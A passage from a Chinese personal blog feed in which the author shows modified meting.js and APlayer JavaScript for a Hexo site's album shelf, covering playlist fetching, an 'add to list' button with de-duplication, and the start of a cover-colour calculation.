class="keyword">for</span> (<span class="keyword">let</span> rule <span class="keyword">of</span> rules) &#123;</span><br><span class="line">        <span class="comment">// 返回匹配</span></span><br><span class="line">        <span class="comment">// eg: &quot;https://y.qq.com/n/yqq/song/001RGrEX3ija5X.html&quot;</span></span><br><span class="line">        <span class="comment">// [&quot;y.qq.com/n/yqq/song/001RGrEX3ija5X.html&quot;, &quot;001RGrEX3ija5X&quot;]</span></span><br><span class="line">        <span class="keyword">let</span> patt = <span class="keyword">new</span> <span class="title class_">RegExp</span>(rule[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">let</span> res = patt.<span class="title function_">exec</span>(options.<span class="property">auto</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (res !== <span class="literal">null</span>) &#123;</span><br><span class="line">          options.<span class="property">server</span> = rule[<span class="number">1</span>]</span><br><span class="line">          options.<span class="property">type</span> = rule[<span class="number">2</span>]</span><br><span class="line">          options.<span class="property">id</span> = res[<span class="number">1</span>]</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">parse</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (options.<span class="property">url</span>) &#123;</span><br><span class="line">      <span class="comment">// 直接构建 APlayer 配置</span></span><br><span class="line">      <span class="keyword">let</span> res = &#123;</span><br><span class="line">        <span class="attr">name</span>: options.<span class="property">name</span> || options.<span class="property">title</span> || <span class="string">&#x27;Audio name&#x27;</span>,</span><br><span class="line">        <span class="attr">artist</span>: options.<span class="property">artist</span> || options.<span class="property">author</span> || <span class="string">&#x27;Audio artist&#x27;</span>,</span><br><span class="line">        <span class="attr">url</span>: options.<span class="property">url</span>,</span><br><span class="line">        <span class="attr">cover</span>: options.<span class="property">cover</span> || options.<span class="property">pic</span>,</span><br><span class="line">        <span class="attr">lrc</span>: options.<span class="property">lrc</span> || options.<span class="property">lyric</span> || <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="attr">type</span>: options.<span class="property">type</span> || <span class="string">&#x27;auto&#x27;</span>,</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      result = res</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// // 1. 通过 meta 拼凑接口参数获得完整接口 （_init 中存放的默认 api）</span></span><br><span class="line">    <span class="comment">// // 2. 请求接口，得到播放列表数据</span></span><br><span class="line">    <span class="keyword">let</span> url = api</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="string">&#x27;:server&#x27;</span>, options.<span class="property">server</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="string">&#x27;:type&#x27;</span>, options.<span class="property">type</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="string">&#x27;:id&#x27;</span>, options.<span class="property">id</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="string">&#x27;:auth&#x27;</span>, options.<span class="property">auth</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="string">&#x27;:r&#x27;</span>, <span class="title class_">Math</span>.<span class="title function_">random</span>())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> r = <span class="keyword">await</span> <span class="title function_">fetch</span>(url)</span><br><span class="line">    <span class="keyword">const</span> res = <span class="keyword">await</span> r.<span class="title function_">json</span>()</span><br><span class="line"></span><br><span class="line">    result = res</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码是一个继承了HTMLElement的类（因为要以HTML标签形式使用），其中最核心的两个部分即<code>init()</code>（调整参数）和<code>parse()</code>（获得播放列表）两个方法。</p>
<p>我把它简单修改成了一个传入配置对象参数就可以获得播放列表的函数，把后续各种构建aplayer实例以及创建DOM元素之类的行为都舍弃了。</p>
<blockquote>
<p>你非得问我的话就是我也不懂（</p>
</blockquote>
<p>然后就是为按钮绑定事件了，但好像产生了新问题：hexo中，用户自定义js好像只能全局引入。</p>
<blockquote>
<p> 如果确实有按页面引入的方法的话请务必告诉我</p>
</blockquote>
<p>这意味着如果我是为music-list还是为music-item绑定事件都不行，因为只有在特定的页面中才会有这两类元素，在其他页面载入话就会产生空指针报错。</p>
<p>最后我想了个笨方法：直接给全局绑定点击事件，并检测点击目标（</p>
<blockquote>
<p>别嘲笑我，我要脸orz。</p>
</blockquote>
<p>具体代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">async</span> (event) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> target = event.<span class="property">target</span></span><br><span class="line">  <span class="keyword">const</span> tagName = target.<span class="property">tagName</span></span><br><span class="line">  <span class="keyword">if</span> (tagName.<span class="title function_">toUpperCase</span>() == <span class="string">&quot;BUTTON&quot;</span> &amp;&amp; target.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&quot;music-play-btn&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> dataset = target.<span class="property">dataset</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dataset.<span class="property">server</span> == <span class="string">&quot;undefined&quot;</span> || dataset.<span class="property">type</span> == <span class="string">&quot;undefined&quot;</span> || dataset.<span class="property">id</span> == <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;param err&quot;</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用上面的魔改meting.js，获取播放列表</span></span><br><span class="line">    <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">getMusicList</span>(&#123;</span><br><span class="line">      <span class="attr">server</span>: dataset.<span class="property">server</span>,</span><br><span class="line">      <span class="attr">type</span>: dataset.<span class="property">type</span>,</span><br><span class="line">      <span class="attr">id</span>: dataset.<span class="property">id</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据全局吸底aplayer构建实例</span></span><br><span class="line">    <span class="keyword">const</span> ap = <span class="keyword">new</span> <span class="title class_">APlayer</span>(&#123;</span><br><span class="line">      <span class="attr">container</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;bottom-aplayer&quot;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ap) &#123;</span><br><span class="line">      <span class="comment">// 清空目前的播放列表</span></span><br><span class="line">      ap.<span class="property">list</span>.<span class="title function_">clear</span>()</span><br><span class="line">      <span class="comment">// 添加播放列表</span></span><br><span class="line">      ap.<span class="property">list</span>.<span class="title function_">add</span>(res)</span><br><span class="line">      <span class="comment">// 获取缓存的音量信息</span></span><br><span class="line">      <span class="keyword">const</span> metingStr = <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&quot;metingjs&quot;</span>)</span><br><span class="line">      <span class="keyword">const</span> metingjs = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(metingStr)</span><br><span class="line">      <span class="keyword">let</span> vol</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">typeof</span> (metingjs.<span class="property">volume</span>) == <span class="string">&quot;number&quot;</span>) &#123;</span><br><span class="line">        vol = metingjs.<span class="property">volume</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        vol = ap.<span class="property">audio</span>.<span class="property">volume</span></span><br><span class="line">      &#125;</span><br><span class="line">      ap.<span class="title function_">volume</span>(vol, <span class="literal">true</span>)</span><br><span class="line">      <span class="comment">// 展开给浏览者看一下，“我已经改好播放列表了！”</span></span><br><span class="line">      ap.<span class="title function_">setMode</span>(<span class="string">&quot;normal&quot;</span>)</span><br><span class="line">      <span class="comment">// 开始播放</span></span><br><span class="line">      ap.<span class="title function_">play</span>()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="literal">true</span>)</span><br></pre></td></tr></table></figure>

<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>随后我又想尝试新的功能：添加一个按钮，点击后不改变播放列表，只是在播放列表末尾插入曲目。</p>
<p>我尝试了一阵子，始终未能成功，但发现了问题所在：</p>
<p>加载站点后所处的的第一个页面，可以从console找到该页面中所有aplayer实例（全部都被butterfly框架放在了<code>aplayers</code>这个数组中，包括吸底aplayer）。</p>
<p>但前往其他页面时，再看<code>aplayers</code>数组，就找不到刚才的实例了。</p>
<p>确实hexo博客不是单页面应用，这样其实也挺正常的。但全局吸底aplayer托了pjax的福，即便页面连续跳转，播放也不间断。</p>
<p>经观察，上面的代码本质上是给原本全局aplayer的位置新建了一个aplayer实例，如果我只想末尾插入曲目，我可能需要获得原本的aplayer实例。</p>
<p>到底该怎么做呢（我不知道pjax的运行机制）。</p>
]]></content>
      <categories>
        <category>前端</category>
        <category>DIY</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>hexo</tag>
        <tag>音乐</tag>
        <tag>DIY</tag>
      </tags>
  </entry>
  <entry>
    <title>唱片架完善+魔改Aplayer</title>
    <url>/web/diy/2.%E5%94%B1%E7%89%87%E6%9E%B6%E5%AE%8C%E5%96%84+%E9%AD%94%E6%94%B9Aplayer.html</url>
    <content><![CDATA[<p>书接上文，因为上次还有未能实现的想法，所以接着鼓捣。</p>
<h1 id="唱片架"><a href="#唱片架" class="headerlink" title="唱片架"></a>唱片架</h1><p>稍稍修改了结构和样式，加上了“添至列表”按钮，点击后就会把这张专里的内容加进左下角播放器的播放列表。</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305311147177.png"></p>
<p>篇幅所限，结构和样式就先省略了。</p>
<h2 id="添至列表"><a href="#添至列表" class="headerlink" title="添至列表"></a>添至列表</h2><p>主要加上了点击“添至列表”的逻辑。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 配合标签外挂music食用~</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> useSnackbar <span class="keyword">from</span> <span class="string">&quot;../Tools/useSnackbar.js&quot;</span></span><br><span class="line"><span class="keyword">import</span> addCoverColor <span class="keyword">from</span> <span class="string">&quot;./addCoverColor.js&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 播放事件委托（</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">async</span> (event) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> target = event.<span class="property">target</span></span><br><span class="line">  <span class="keyword">const</span> tagName = target.<span class="property">tagName</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> dataset = target.<span class="property">dataset</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 参数有误</span></span><br><span class="line">  <span class="keyword">if</span> (dataset.<span class="property">server</span> == <span class="string">&quot;undefined&quot;</span> || dataset.<span class="property">type</span> == <span class="string">&quot;undefined&quot;</span> || dataset.<span class="property">id</span> == <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 点击操作按钮</span></span><br><span class="line">  <span class="keyword">if</span> (tagName.<span class="title function_">toUpperCase</span>() == <span class="string">&quot;BUTTON&quot;</span> &amp;&amp; target.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&quot;music-play-btn&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// 获得音乐列表</span></span><br><span class="line">    <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">getMusicList</span>(&#123;</span><br><span class="line">      <span class="attr">server</span>: dataset.<span class="property">server</span>,</span><br><span class="line">      <span class="attr">type</span>: dataset.<span class="property">type</span>,</span><br><span class="line">      <span class="attr">id</span>: dataset.<span class="property">id</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> ap = <span class="variable language_">window</span>.<span class="property">fixedap</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ap) &#123;</span><br><span class="line">      <span class="keyword">if</span> (target.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&quot;play-album&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 清空并添加</span></span><br><span class="line">        ap.<span class="property">list</span>.<span class="title function_">clear</span>()</span><br><span class="line">        ap.<span class="property">list</span>.<span class="title function_">add</span>(res)</span><br><span class="line">        ap.<span class="title function_">setMode</span>(<span class="string">&quot;normal&quot;</span>)</span><br><span class="line">        ap.<span class="title function_">play</span>()</span><br><span class="line">        <span class="title function_">useSnackbar</span>(<span class="string">&quot;让你见识见识我珍藏已久的好曲子（〃｀ 3′〃）&quot;</span>)</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (target.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&quot;add-album&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 目前的播放列表</span></span><br><span class="line">        <span class="keyword">const</span> nowList = ap.<span class="property">list</span>.<span class="property">audios</span></span><br><span class="line">        <span class="comment">// 去重</span></span><br><span class="line">        <span class="keyword">const</span> res2 = res.<span class="title function_">filter</span>(<span class="function"><span class="params">r</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> !nowList.<span class="title function_">some</span>(<span class="function"><span class="params">n</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> n.<span class="property">url</span> === r.<span class="property">url</span></span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 全是重复</span></span><br><span class="line">        <span class="keyword">if</span> (res2.<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="title function_">useSnackbar</span>(<span class="string">&quot;添加过的就不要再加啦w(ﾟДﾟ)w&quot;</span>)</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加</span></span><br><span class="line">        ap.<span class="property">list</span>.<span class="title function_">add</span>(res2)</span><br><span class="line">        ap.<span class="title function_">setMode</span>(<span class="string">&quot;normal&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 滚动音乐列表</span></span><br><span class="line">        <span class="keyword">const</span> apDOM = ap.<span class="property">options</span>.<span class="property">container</span></span><br><span class="line">        <span class="keyword">const</span> apolDOM = apDOM.<span class="title function_">querySelector</span>(<span class="string">&quot;ol&quot;</span>)</span><br><span class="line">        <span class="keyword">const</span> scrollHeight = apolDOM.<span class="property">scrollHeight</span></span><br><span class="line">        apolDOM.<span class="title function_">scrollTo</span>(&#123; <span class="attr">top</span>: scrollHeight, <span class="attr">behavior</span>: <span class="string">&quot;smooth&quot;</span> &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="title function_">useSnackbar</span>(<span class="string">&quot;加到播放列表里啦，慢慢听ᕕ( ᐛ )ᕗ&quot;</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 点击标题</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (target.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&quot;music-to-site&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">let</span> href</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(dataset.<span class="property">server</span>) &#123;</span><br><span class="line">      <span class="keyword">case</span>(<span class="string">&quot;netease&quot;</span>):</span><br><span class="line">        href = <span class="string">`https://music.163.com/#/<span class="subst">$&#123;dataset.type&#125;</span>?id=<span class="subst">$&#123;dataset.id&#125;</span>`</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">case</span>(<span class="string">&quot;tencent&quot;</span>):</span><br><span class="line">        <span class="keyword">let</span> type</span><br><span class="line">        <span class="keyword">if</span>(dataset.<span class="property">type</span> === <span class="string">&quot;song&quot;</span>) &#123;</span><br><span class="line">          type = <span class="string">&quot;songDetail&quot;</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(dataset.<span class="property">type</span> === <span class="string">&quot;album&quot;</span>) &#123;</span><br><span class="line">          type = <span class="string">&quot;albumDetail&quot;</span></span><br><span class="line">        &#125; <span class="keyword">else</span> type = <span class="string">&quot;playlist&quot;</span></span><br><span class="line"></span><br><span class="line">        href = <span class="string">`https://y.qq.com/n/ryqq/<span class="subst">$&#123;type&#125;</span>/<span class="subst">$&#123;dataset.id&#125;</span>`</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(href)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(href) &#123;</span><br><span class="line">      <span class="variable language_">window</span>.<span class="title function_">open</span>(href)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得音乐列表</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">getMusicList</span> = <span class="keyword">async</span> (<span class="params">options</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> (options) !== <span class="string">&quot;object&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> api</span><br><span class="line">  <span class="keyword">let</span> result</span><br><span class="line"></span><br><span class="line">  <span class="comment">//初始化</span></span><br><span class="line">  <span class="title function_">init</span>()</span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">parse</span>()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">init</span>(<span class="params"></span>) &#123;</span><br><span class="line">    api =</span><br><span class="line">      options.<span class="property">api</span> ||</span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">meting_api</span> ||</span><br><span class="line">      <span class="string">&#x27;https://api.i-meto.com/meting/api?server=:server&amp;type=:type&amp;id=:id&amp;r=:r&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (options.<span class="property">auto</span>) <span class="title function_">_parse_link</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_parse_link</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">let</span> rules = [</span><br><span class="line">        [<span class="string">&#x27;music.163.com.*song.*id=(\\d+)&#x27;</span>, <span class="string">&#x27;netease&#x27;</span>, <span class="string">&#x27;song&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;music.163.com.*album.*id=(\\d+)&#x27;</span>, <span class="string">&#x27;netease&#x27;</span>, <span class="string">&#x27;album&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;music.163.com.*artist.*id=(\\d+)&#x27;</span>, <span class="string">&#x27;netease&#x27;</span>, <span class="string">&#x27;artist&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;music.163.com.*playlist.*id=(\\d+)&#x27;</span>, <span class="string">&#x27;netease&#x27;</span>, <span class="string">&#x27;playlist&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;music.163.com.*discover/toplist.*id=(\\d+)&#x27;</span>, <span class="string">&#x27;netease&#x27;</span>, <span class="string">&#x27;playlist&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;y.qq.com.*song/(\\w+).html&#x27;</span>, <span class="string">&#x27;tencent&#x27;</span>, <span class="string">&#x27;song&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;y.qq.com.*album/(\\w+).html&#x27;</span>, <span class="string">&#x27;tencent&#x27;</span>, <span class="string">&#x27;album&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;y.qq.com.*singer/(\\w+).html&#x27;</span>, <span class="string">&#x27;tencent&#x27;</span>, <span class="string">&#x27;artist&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;y.qq.com.*playsquare/(\\w+).html&#x27;</span>, <span class="string">&#x27;tencent&#x27;</span>, <span class="string">&#x27;playlist&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;y.qq.com.*playlist/(\\w+).html&#x27;</span>, <span class="string">&#x27;tencent&#x27;</span>, <span class="string">&#x27;playlist&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;xiami.com.*song/(\\w+)&#x27;</span>, <span class="string">&#x27;xiami&#x27;</span>, <span class="string">&#x27;song&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;xiami.com.*album/(\\w+)&#x27;</span>, <span class="string">&#x27;xiami&#x27;</span>, <span class="string">&#x27;album&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;xiami.com.*artist/(\\w+)&#x27;</span>, <span class="string">&#x27;xiami&#x27;</span>, <span class="string">&#x27;artist&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;xiami.com.*collect/(\\w+)&#x27;</span>, <span class="string">&#x27;xiami&#x27;</span>, <span class="string">&#x27;playlist&#x27;</span>],</span><br><span class="line">      ]</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> rule <span class="keyword">of</span> rules) &#123;</span><br><span class="line">        <span class="comment">// 返回匹配</span></span><br><span class="line">        <span class="comment">// eg: &quot;https://y.qq.com/n/yqq/song/001RGrEX3ija5X.html&quot;</span></span><br><span class="line">        <span class="comment">// [&quot;y.qq.com/n/yqq/song/001RGrEX3ija5X.html&quot;, &quot;001RGrEX3ija5X&quot;]</span></span><br><span class="line">        <span class="keyword">let</span> patt = <span class="keyword">new</span> <span class="title class_">RegExp</span>(rule[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">let</span> res = patt.<span class="title function_">exec</span>(options.<span class="property">auto</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (res !== <span class="literal">null</span>) &#123;</span><br><span class="line">          options.<span class="property">server</span> = rule[<span class="number">1</span>]</span><br><span class="line">          options.<span class="property">type</span> = rule[<span class="number">2</span>]</span><br><span class="line">          options.<span class="property">id</span> = res[<span class="number">1</span>]</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">parse</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (options.<span class="property">url</span>) &#123;</span><br><span class="line">      <span class="comment">// 直接构建 APlayer 配置并加载 APlayer</span></span><br><span class="line">      <span class="keyword">let</span> res = &#123;</span><br><span class="line">        <span class="attr">name</span>: options.<span class="property">name</span> || options.<span class="property">title</span> || <span class="string">&#x27;Audio name&#x27;</span>,</span><br><span class="line">        <span class="attr">artist</span>: options.<span class="property">artist</span> || options.<span class="property">author</span> || <span class="string">&#x27;Audio artist&#x27;</span>,</span><br><span class="line">        <span class="attr">url</span>: options.<span class="property">url</span>,</span><br><span class="line">        <span class="attr">cover</span>: options.<span class="property">cover</span> || options.<span class="property">pic</span>,</span><br><span class="line">        <span class="attr">lrc</span>: options.<span class="property">lrc</span> || options.<span class="property">lyric</span> || <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="attr">type</span>: options.<span class="property">type</span> || <span class="string">&#x27;auto&#x27;</span>,</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = <span class="keyword">await</span> <span class="title function_">addCoverColor</span>(res)</span><br><span class="line">      &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// // 1. 通过 meta 拼凑接口参数获得完整接口 （_init 中存放的默认 api）</span></span><br><span class="line">    <span class="comment">// // 2. 请求接口，得到播放列表数据</span></span><br><span class="line">    <span class="comment">// // 3. 加载 APlayer</span></span><br><span class="line">    <span class="keyword">let</span> url = api</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="string">&#x27;:server&#x27;</span>, options.<span class="property">server</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="string">&#x27;:type&#x27;</span>, options.<span class="property">type</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="string">&#x27;:id&#x27;</span>, options.<span class="property">id</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="string">&#x27;:auth&#x27;</span>, options.<span class="property">auth</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="string">&#x27;:r&#x27;</span>, <span class="title class_">Math</span>.<span class="title function_">random</span>())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> r = <span class="keyword">await</span> <span class="title function_">fetch</span>(url)</span><br><span class="line">    <span class="keyword">const</span> res = <span class="keyword">await</span> r.<span class="title function_">json</span>()</span><br><span class="line"></span><br><span class="line">    result = res</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">addCoverColor</span>(result)</span><br><span class="line">  &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="提取封面颜色值"><a href="#提取封面颜色值" class="headerlink" title="提取封面颜色值"></a>提取封面颜色值</h2><p>为播放器样式自适应准备的东西。</p>
<h3 id="根据图片获取平均色值"><a href="#根据图片获取平均色值" class="headerlink" title="根据图片获取平均色值"></a>根据图片获取平均色值</h3><p>使用canvas计算图片的rgb色值</p>
<p>获取网络图片应该是个异步的操作，所以返回一个Promise。</p>
<p>QQ音乐源的封面出现了跨域问题，如果有大佬知道怎么解决请务必教导我（网易云源一切正常）。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 计算专辑图片的平均色值（rgb）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// js创建一个canvas元素</span></span><br><span class="line"><span class="keyword">const</span> canvas = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;canvas&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 表示绘制一个2d图</span></span><br><span class="line"><span class="keyword">const</span> context = canvas.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>,&#123;<span class="attr">willReadFrequently</span>:<span class="literal">true</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> (src) =&gt; &#123;</span><br><span class="line">  <span class="comment">// 创建图片元素用来加载图片地址        </span></span><br><span class="line">  <span class="keyword">const</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将图片地址传给nimg</span></span><br><span class="line">  img.<span class="property">src</span> = src</span><br><span class="line">  img.<span class="property">crossOrigin</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      img.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取图片的大小</span></span><br><span class="line">        <span class="keyword">const</span> width = img.<span class="property">width</span></span><br><span class="line">        <span class="keyword">const</span> height = img.<span class="property">height</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置canvas的大小</span></span><br><span class="line">        canvas.<span class="property">width</span> = width</span><br><span class="line">        canvas.<span class="property">height</span> = height</span><br><span class="line"></span><br><span class="line">        <span class="comment">// rgba值</span></span><br><span class="line">        <span class="keyword">let</span> r = <span class="number">0</span></span><br><span class="line">        <span class="keyword">let</span> g = <span class="number">0</span></span><br><span class="line">        <span class="keyword">let</span> b = <span class="number">0</span></span><br><span class="line">        <span class="keyword">let</span> a = <span class="number">0</span></span><br><span class="line">        <span class="keyword">const</span> fxs = width * height</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置要绘制的图片</span></span><br><span class="line">        context.<span class="title function_">drawImage</span>(img, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取图片的像素信息，并.data获得数组</span></span><br><span class="line">        <span class="keyword">const</span> data = context.<span class="title function_">getImageData</span>(<span class="number">0</span>, <span class="number">0</span>, width, height).<span class="property">data</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取所有的rgba的和</span></span><br><span 